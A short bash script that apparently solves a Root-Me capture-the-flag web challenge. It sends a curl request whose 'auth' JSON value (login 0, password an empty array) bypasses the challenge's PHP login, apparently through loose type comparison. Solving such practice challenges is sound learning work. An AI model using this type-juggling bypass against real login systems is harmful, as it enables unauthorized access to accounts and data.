#!/bin/bash

curl -s --data-urlencode 'auth={"data":{"login":0,"password":[]}}' http://challenge01.root-me.org/web-serveur/ch44/auth.php | grep -o "Dont.*n"
